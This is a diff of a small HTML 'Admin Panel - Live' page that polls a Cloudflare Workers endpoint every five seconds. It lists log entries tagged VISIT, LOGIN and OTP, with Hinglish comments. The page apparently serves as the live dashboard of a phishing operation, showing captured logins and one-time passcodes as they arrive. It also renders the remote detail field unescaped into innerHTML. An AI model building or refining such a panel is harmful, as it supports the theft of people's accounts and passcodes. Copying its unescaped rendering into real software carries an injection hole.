@@ -3,108 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin Live</title>
+    <title>Admin Panel - Live</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-        body { background-color: #f4f4f9; padding-bottom: 30px; }
+        body { background-color: #f0f2f5; padding-bottom: 50px; }
 
         /* Header */
         .header {
-            background: #315195;
-            color: white;
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            background: #315195; color: white; padding: 15px 20px;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
         .header h1 { font-size: 18px; }
-        .v-count { background: #fff; color: #315195; padding: 2px 10px; border-radius: 15px; font-weight: 900; }
+        .v-badge { background: #ff9800; padding: 4px 12px; border-radius: 20px; font-weight: 800; font-size: 15px; }
 
-        .container { padding: 10px; display: flex; flex-direction: column; gap: 10px; }
+        .container { padding: 12px; display: flex; flex-direction: column; gap: 10px; }
 
-        /* Vertical Cards */
+        /* Card Design */
         .card {
-            background: #fff;
-            border-radius: 8px;
-            padding: 15px;
-            border-left: 6px solid #315195;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            background: #fff; border-radius: 10px; padding: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05); border-left: 6px solid #315195;
         }
-
-        .card-top { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
+        .card-top { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
         .tag { font-size: 11px; font-weight: 800; color: #315195; text-transform: uppercase; }
         .time { font-size: 10px; color: #999; }
 
-        /* Alag-Alag Line ka Logic */
-        .detail-text { 
-            font-size: 16px; 
-            color: #222; 
-            font-weight: 700; 
-            line-height: 1.8; /* Line ke beech gap */
-            white-space: pre-wrap; /* \n ko asli line break mein badal dega */
-            word-break: break-all;
+        /* Multi-line Data Detail */
+        .detail { 
+            font-size: 16px; color: #222; font-weight: 700; 
+            line-height: 1.6; white-space: pre-wrap; word-break: break-all;
         }
 
-        /* Color Coding */
-        .card-login { border-left-color: #28a745; }
-        .card-otp { border-left-color: #ff9800; }
+        /* Color classes */
+        .card-login { border-left-color: #28a745; background: #f1fff4; }
+        .card-otp { border-left-color: #ff9800; background: #fffcf0; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>LIVE DATA</h1>
-        <div class="v-count" id="vTotal">0</div>
+        <h1>DASHBOARD</h1>
+        <div class="v-badge" id="count">0</div>
     </div>
 
-    <div class="container" id="displayArea">
+    <div class="container" id="box">
         </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function loadData() {
+        async function refresh() {
             try {
                 const res = await fetch(workerURL);
                 const data = await res.json();
                 
-                const area = document.getElementById('displayArea');
-                const vCount = document.getElementById('vTotal');
+                const box = document.getElementById('box');
+                const badge = document.getElementById('count');
 
                 if (!data || data.length === 0) {
-                    area.innerHTML = "<p style='text-align:center;margin-top:50px;color:#999;'>Waiting...</p>";
+                    box.innerHTML = "<p style='text-align:center;margin-top:50px;color:#999;'>No Logs Found</p>";
+                    badge.innerText = "0";
                     return;
                 }
 
-                // Total Visit Count
-                vCount.innerText = data.filter(l => String(l.type).includes("VISIT")).length;
+                // --- COUNT LOGIC (Simplified) ---
+                // Agar data list mein hai, toh uska length hi total count hai
+                badge.innerText = data.length; 
 
                 // Render Logs
-                area.innerHTML = data.map(log => {
-                    let cType = "";
-                    if(log.type.includes("LOGIN")) cType = "card-login";
-                    if(log.type.includes("OTP")) cType = "card-otp";
+                box.innerHTML = data.map(log => {
+                    let typeClass = "";
+                    if(String(log.type).includes("LOGIN")) typeClass = "card-login";
+                    if(String(log.type).includes("OTP")) typeClass = "card-otp";
 
                     return `
-                        <div class="card ${cType}">
+                        <div class="card ${typeClass}">
                             <div class="card-top">
                                 <span class="tag">${log.type}</span>
                                 <span class="time">${log.time}</span>
                             </div>
-                            <div class="detail-text">${log.detail}</div>
+                            <div class="detail">${log.detail}</div>
                         </div>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Updating..."); }
+            } catch (e) { console.log("Syncing..."); }
         }
 
-        setInterval(loadData, 5000);
-        window.onload = loadData;
+        // Har 5 second mein update
+        setInterval(refresh, 5000);
+        window.onload = refresh;
     </script>
 </body>
 </html>
